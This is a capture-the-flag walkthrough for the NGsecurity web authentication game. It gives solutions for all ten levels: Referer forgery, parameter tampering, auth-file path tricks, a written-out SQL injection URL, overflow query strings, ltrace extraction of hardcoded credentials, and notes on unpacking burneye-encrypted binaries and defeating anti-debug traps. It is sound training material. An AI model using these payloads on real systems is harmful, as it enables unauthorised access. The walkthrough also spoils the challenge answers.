@@ -1,0 +1,529 @@
+============================================================================================================
+
+                              NGsecurity Games Web Authentication Game#1 Solutions
+                                          http://quiz.ngsec.biz:8080/
+
+
+  I think the games are fun. Here is my notes/solutions on Game #1. No i did not cheat/ask
+anyone for hints or solutions, to me thats not fun nor does one learn anything by doing so.
+If you really want to play the games and mabee learn something new then don't read this.
+
+-nocon
+
+
+=============================================================================================================
+
+
+Level 1
+-----------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level1/index.php
+
+
+SOLVE:
+
+  Use the provided Hint: Password is related to this company.
+
+password = ngsec
+
+
+
+Level 2
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level2/l33t.php
+
+
+SOLVE:
+
+[nocon]$ telnet quiz.ngsec.biz 8080
+Trying 213.4.15.133...
+Connected to quiz.ngsec.biz.
+Escape character is '^]'.
+POST /game1/level2/validate_l33t.php?login=admin&password=ngsec HTTP/1.0
+Referer: http://www.ngsec.com/company.html
+Host: quiz.ngsec.biz
+
+[...]
+
+<span class="cab"><b>Level 2 Completed!</b></span><p>
+<p class="txt"><b>CONGRATULATIONS!!! Authentication Completed!</b></p>
+<p class="txt">At this point <b>you should update your score</b> filling this form.</p>
+<p class="txt"><b>Not yet registered?</b> Follow this link: <a href="../register.html">Registration Form</a></p>
+<form action="http://quiz.ngsec.biz:8080/game1/update_score.php" method="POST">
+<input type="hidden" name="MAGIC_VALUE" value="NGrules">
+<span class="txt"><b>Nickname</b></span>
+<input type="text" name="nick"><br>
+<span class="txt"><b>Password</b></span>
+<input type="password" name="password"><br>
+<input type="submit" value="Submit score">
+
+[...]
+
+http://quiz.ngsec.biz:8080/game1/update_score.php?nick=yourusername&MAGIC_VALUE=NGrules&password=yourpassword
+
+
+
+Level 3
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level3/NGrules.php
+
+
+SOLVE:
+
+  Look at the Pseudo source code of the validate_NGrules.php
+
+[...]
+
+   if ($state=="NGauthenticated") {
+
+       AUTHENTICATION COMPLETED STUFF
+
+     }  else {
+
+[...]
+
+
+http://quiz.ngsec.biz:8080/game1/level3/validate_NGrules.php?login=&password=&state=NGauthenticated
+
+
+
+Level 4
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level4/tryforfun.php
+
+
+SOLVE:
+
+    Look at the Pseudo source code of the validate_tryforfun.php
+         http://quiz.ngsec.biz:8080/game1/level4/validate_tryforfun.txt
+
+    And look at the Format of the Auth File,
+         http://quiz.ngsec.biz:8080/game1/level4/auth_file-format.txt
+
+    Trick validate_tryforfun.php to read the auth_file-format.txt file it will
+    use "user" and "password" as valid auth input.
+
+http://quiz.ngsec.biz:8080/game1/level4/validate_tryforfun.php?login=user&password=password&auth_file=./auth_file-format.txt
+
+
+
+
+Level 5
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level5/achtung.php
+
+
+SOLVE:
+
+       Look at Pseudo source code of the validate_achtung.php
+           http://quiz.ngsec.biz:8080/game1/level5/validate_achtung.txt
+
+[...]
+
+$result=mysql_db_query($db,"SELECT * FROM $table WHERE user='$login' AND pass='$password'");
+
+[...]
+
+    Pass adidtional sql statment to the database ie: SQL Injection
+http://quiz.ngsec.biz:8080/game1/level5/validate_achtung.php?login=admin&password=bla%27+or+user+%3C+%27s%27%27
+
+       The the above URL results in the following statment passed to the database
+
+            SELECT * FROM $table WHERE user='$login' AND pass='$password' OR user < 's''
+
+
+
+
+Level 6
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level6/replicant.php
+
+
+SOLVE:
+
+     Look at Pseudo Source code of validate_replicant.cgi
+          http://quiz.ngsec.biz:8080/game1/level6/validate_replicant.txt
+
+[...]
+
+char user[128];
+
+   ......
+
+*(ch_ptr_end++)='\0';
+strcpy(user,ch_ptr_begin);
+
+[...]
+
+
+    http://quiz.ngsec.biz:8080/game1/level6/validate_replicant.cgi?login=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&password=\00
+
+
+Level 7
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level7/net-dreamer.php
+
+
+SOLVE:
+
+       Look at Pseudo Source code of validate_net-dreamer.cgi
+           http://quiz.ngsec.biz:8080/game1/level7/validate_net-dreamer.txt
+
+[...]
+
+ *(ch_ptr_end++)='\0';
+ strncpy(user,ch_ptr_begin,sizeof(user));
+
+  ......
+
+strncpy(pass,ch_ptr_begin,sizeof(pass));
+
+
+ if ((strcmp(user,GOOD_USER)==0) && (strcmp(pass,GOOD_PASS)==0))
+
+    // AUTHENTICATION OK!!
+
+
+    } else {
+
+    // AUTHENTICATION ERROR
+    show_error(user,pass);
+
+
+[...]
+
+       http://quiz.ngsec.biz:8080/game1/level7/validate_net-dreamer.cgi?login=\00&password=0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+
+
+   The above URL will result in giving you the username and password printed in the error
+
+[...]
+
+Authentication ERROR!
+
+Either your username (\00) or password (00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000Correct user is beowulf with password athlon ) are incorrect. Please go back and try again.
+
+[...]
+
+
+
+
+Level 8
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level8/LA2019.php
+
+
+SOLVE:
+
+    Look at the non-valid examples
+          http://quiz.ngsec.biz:8080/game1/level8/user_passwords.txt
+
+
+    Password Algorithm is username ((ROT13 encoded)+(char in username))
+    username can be whatever
+
+example:
+
+USER example: aaaaaa
+Passwd is: nopqrs
+
+first char a = 13+0 = n
+second char a  = 13+2 = o
+third char a = 13+3 = p
+fourth char a = 13+4 = q
+fifth char a = 13+5 = r
+sixth char a = 13+6 = s
+
+
+Level 9
+------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level9/onlyforyoureyes.php
+
+SOLVE:
+
+      Download the linux Executable of validate_onlyforyoureyes
+          [nocon]$ wget http://quiz.ngsec.biz:8080/game1/level9/validate_onlyforyoureyes
+
+
+      Using ltrace we can get the usename and password.
+
+
+[nocon]$ ltrace -C ./validate_onlyforyoureyes "login=&password="
+__libc_start_main(0x08048528, 2, 0xbffffb54, 0x08048350, 0x0804880c
+<unfinished ...>
+__register_frame_info(0x08049c30, 0x08049d40, 16, 0x4213030c, 0x0804880c) = 0x08049c30
+memset(0xbffffa68, '\000', 128)                   = 0xbffffa68
+strstr("login=&password=", "login=")              = "login=&password="
+strstr("&password=", "&")                         = "&password="
+strncpy(0xbffffa68, "", 127)                      = 0xbffffa68
+memset(0xbffff5a0, '\000', 48)                    = 0xbffff5a0
+memset(0xbffff9e8, '\000', 128)                   = 0xbffff9e8
+strstr("password=", "password=")                  = "password="
+strstr("", "&")                                   = NULL
+strncpy(0xbffff9e8, "", 127)                      = 0xbffff9e8
+strcmp("", "Zincompetencia")                      = -1 <--------------------------   /**** Username ******/
+printf("\n<center>\n<p class="cab"><b>Au"...
+<center>
+<p class="cab"><b>Authentication ERROR!</b></p>
+<p class="txt">Either your username or password are incorrect. Please go back
+and try again.</p>
+</center>
+
+)     = 166
+exit(-1)                                          = <void>
+__deregister_frame_info(0x08049c30, 0x400134c0, 0x400136d0, 0x4001386c, 0xbffff520) = 0
++++ exited (status 255) +++
+[nocon]$
+
+
+[nocon]$ ltrace -C ./validate_onlyforyoureyes "login=Zincompetencia&password="
+__libc_start_main(0x08048528, 2, 0xbffffb44, 0x08048350, 0x0804880c <unfinished ...>
+__register_frame_info(0x08049c30, 0x08049d40, 16, 0x4213030c, 0x0804880c) = 0x08049c30
+memset(0xbffffa58, '\000', 128)                   = 0xbffffa58
+strstr("login=Zincompetencia&password=", "login=") = "login=Zincompetencia&password="
+strstr("Zincompetencia&password=", "&")           = "&password="
+strncpy(0xbffffa58, "Zincompetencia", 127)        = 0xbffffa58
+memset(0xbffff590, '\000', 48)                    = 0xbffff590
+memset(0xbffff9d8, '\000', 128)                   = 0xbffff9d8
+strstr("password=", "password=")                  = "password="
+strstr("", "&")                                   = NULL
+strncpy(0xbffff9d8, "", 127)                      = 0xbffff9d8
+strcmp("Zincompetencia", "Zincompetencia")        = 0
+strcmp("", "Zgalopante")                          = -1  <------------------ /**** Password *****/
+printf("\n<center>\n<p class="cab"><b>Au"...
+<center>
+<p class="cab"><b>Authentication ERROR!</b></p>
+<p class="txt">Either your username or password are incorrect. Please go back
+and try again.</p>
+</center>
+
+)     = 166
+exit(-1)                                          = <void>
+__deregister_frame_info(0x08049c30, 0x400134c0, 0x400136d0, 0x4001386c, 0xbffff510) = 0
++++ exited (status 255) +++
+[nocon]$
+
+
+[nocon]$ ltrace -C ./validate_onlyforyoureyes "login=Zincompetencia&password=Zgalopante"
+__libc_start_main(0x08048528, 2, 0xbffffb44, 0x08048350, 0x0804880c <unfinished ...>
+__register_frame_info(0x08049c30, 0x08049d40, 16, 0x4213030c, 0x0804880c) = 0x08049c30
+memset(0xbffffa58, '\000', 128)                   = 0xbffffa58
+strstr("login=Zincompetencia&password=Zg"..., "login=") = "login=Zincompetencia&password=Zg"...
+strstr("Zincompetencia&password=Zgalopan"..., "&") = "&password=Zgalopante"
+strncpy(0xbffffa58, "Zincompetencia", 127)        = 0xbffffa58
+memset(0xbffff590, '\000', 48)                    = 0xbffff590
+memset(0xbffff9d8, '\000', 128)                   = 0xbffff9d8
+strstr("password=Zgalopante", "password=")        = "password=Zgalopante"
+strstr("Zgalopante", "&")                         = NULL
+strncpy(0xbffff9d8, "Zgalopante", 127)            = 0xbffff9d8
+strcmp("Zincompetencia", "Zincompetencia")        = 0
+strcmp("Zgalopante", "Zgalopante")                = 0
+printf("\n<center>\n<span class="cab"><b"...
+<center>
+<span class="cab"><b>Level 9 Completed!</b></span><p>
+<p class="txt"><b>CONGRATULATIONS!!! Authentication Completed!</b></p>
+<p class="txt">At this point <b>you should update your score</b> filling this
+form.</p>
+<p class="txt"><b>Not yet registered?</b> Follow this link: <a
+href="../register.php">Registration Form</a></p>
+<form action="http://quiz1.ngsec.biz:8080/game1/update_score.php" method="POST">
+<input type="hidden" name="MAGIC_VALUE" value="MoD">
+<span class="txt"><b>Nickname</b></span>
+<input type="text" name="nick"><br>
+<span class="txt"><b>Password</b></span>
+<input type="password" name="password"><br>
+<input type="submit" value="Submit score">
+</form>
+</center>
+
+)     = 693
+__deregister_frame_info(0x08049c30, 0x400134c0, 0x40013bc8, 0x40013d64,
+0xbffffad0) = 0
++++ exited (status 181) +++
+[nocon]$
+
+
+
+
+Level 10
+---------------------------------------------------
+
+URL:
+http://quiz.ngsec.biz:8080/game1/level10/MoD.php
+
+SOLVE:
+
+    I won't give the answer for Level 10 but give ya some additional URL's to read and
+some tools that will help ;-P
+
+
+Tools:
+
+http://www.duho.org/byterage/source/index.html
+
+[...]
+
+[burndump.c] TEEE TESO Elf Encryption Engine burneye unwrapper
+[uncripple.c] Adds a .text section to an ELF without a section header table
+[UNFburninhell1.0.tar.gz] TEEE TESO Elf Encryption Engine burneye layer 1 & 2 cracker
+
+[...]
+
+burneye1 complete sources,
+
+http://teso.scene.at/releases/burneye-1.0.1-src.tar.bz2
+
+
+/********************************************************************************************************************/
+
+  The following text is from
+
+http://www.activalink.com/reviews/elf.php
+
+
+
+Part I
+Well, the objective of this final stage is to pass it and become a g00r00! And
+to do so we are prompted a little form at this level which is inviting us to
+introduce username and password in it and validate. Unfortunately nobody is
+giving you any help, neither there is a forum nor the possibility to talk to
+any of the participants who are in the same fucking situation. Below there are
+coupla links which will permit you to download the binary version of the
+validator. You can download it here if you want to have some fun on your own.
+We are also given some documentation (Runtime Binary Encryption) to take a
+look at.
+
+Actually, from all this documentation we should write down all the important
+words such as ptrace();, gdb, strings, objdump, readelf, ltrace/strace, IDA,
+ELF, libbfd . At the end of the text we can find uuencoded version of a tar.gz
+file which we should download, as a matter of course. Inside this file you
+will find 2 other tar.gz's and a load.c file. Load.c is useless, at least for
+me, and it does not compile under my linux box. The file dacryfile.tar.gz is
+not userfull either (don't confuse dacryfile with dacrofilia :). While the
+file called burneye-stripped.tar.gz is useful for sure. This one is the one!
+
+So we should change to the directory src and run make all. This will think a
+bit, cout a lot of things to STDOUT, and after it is done we will get a whole
+bunch of binaries in different directories. The binaries are burneye,
+stub/stub.bin, debug/memdump. From what i understand, and I have not yet
+completed this level we should only use debug/memdump. This is an application
+that will permit us to extract from memory the code of the application.
+
+Keep in mind that the binary is obfuscated, not password protected so it would
+be somewhat easy (burneye level 1 protection). A good place to visit is TESO
+website. They have invented burneye binary encryption. And how on earth do I
+know it is burneye encrypted?! Because I know, when we reach a certain point
+you will be able to verify it.
+
+Part II
+Ho ho ho! This is the last part of the analysis. Finally, today after
+sleepless 80 hours I have finished the contest! WOW, I am so satisfied, dunno
+what is better, sex or hacking. Before I go to sleep I decided to finish up
+this document to give at least some basis for those who have to deal with
+burneye encrypted files (obfuscation level). If you need to find out how to
+break burneye level 2 protection, see X2 binary analysis.
+
+First, you need to try the binary with your favorite debugger, try to load the
+binary. If it reports that the format has not been recognized and objdump also
+reports some stupid complains about its hard life, don't worry. It is because
+weak ptrace(); based debuggers cannot handle trivial breakpoint trap (those of
+you who have dealt with Wdasm32, SoftICE, Pice or any other debugger the
+concept will be very familiar, as this techniques have been used since some
+years in PE executables under windows/dos operating systems).
+
+Note that burneye later deploys a trivial debugger detection, which you'd have
+to bypass in order to succeed.
+
+Example:
+11369:01 SYS signal (5, 0x5371a0c) = 0
+11369:01 + signal 5 = Trace/breakpoint trap
+11369:01 + 0x5371a0c = fnct_7
+Then, it does the following (you have to use a debugger to see it):
+
+053714c0 [fnct_4+80]: movl %esi,0xfffffd24(%ebp)
+053714c6 [fnct_4+86]: int3
+053714c7 [fnct_4+87]: cmpl $0x0,0x5375748
+053714ce [fnct_4+94]: jne $0x53714e2 [fnct_4+114]
+053714d0 [fnct_4+96]: xorl %eax,%eax
+
+We have two options, simulate its behavior or actually call it.
+The first option is easier, as the handler simply increases 0x5375748 by one:
+
+05371a0c [fnct_7]: pushl %ebp
+05371a0d [fnct_7+1]: movl %esp,%ebp
+05371a0f [fnct_7+3]: incl 0x5375748
+05371a15 [fnct_7+9]: leave
+05371a16 [fnct_7+10]: ret
+
+...and initial value is 0. Let's do the trick:
+
+>> setmem 0x5375748 1
+Memory at address 0x5375748 modified.
+>> run
+
+Resuming at 0x53714e2...
+
+Well, this might seem too difficult for you if you don't program in Assembly,
+in this case you can do it much easier:
+
+Fire up gdb ./nameoffile. Make it run, it will begin to complain about the
+breakpoint trap with something like this:
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x053714c7 in ?? ()
+
+Then exit from gdb. Get yourself the memdump elf which is circulating all over
+internet (if you do not wish to seek, you can find it with the stripped
+version of burneye at teso-team website, in the releases section). Compile
+it....then run ./memdump 0x053714c7 ./cryptedfile. It will begin to think,
+think, and think. Then normally, if everything goes well, and you have found
+out correctly the breakpoint trap address, it will generate 2 or more files
+with "rwxp" extension. One of them is the decrypted but garbled version of the
+binary. It will segfault all the time, do not cry, coz I cried! Use your
+favorite hex editor to tailor the file. I will go on no more as all the fun
+will be fucked! Happy hacking, guyz!
+
+stAtic v0id
+
+References:
+
+[1] Phrack Issue Volume 0x0b, Issue 0x3a, Phile #0x05 of 0x0e
+    Armouring the ELF: Binary encryption on the UNIX platform
+[2] Tool Interface Standard, Executeable and Linking Format, Version 1.2
+    http://segfault.net/~scut/cpu/generic/TIS-ELF_v1.2.pdf
+[3] Fenris - Program execution path analysis tool
+    http://razor.bindview.com/tools/fenris/
+Featured Challenges && Projects
+
+ActivaLink is participating in different projects. Saying project I do not
+mean that we have organized all of them but we are participating in them
+and/or trying to win, which is the game made for.
+
+
+/********************************************************************************************************************/
+
+
+
+
+
+
+Thats all. Now don't you feel better about yourself knowing that you completely cheated ?
+
+
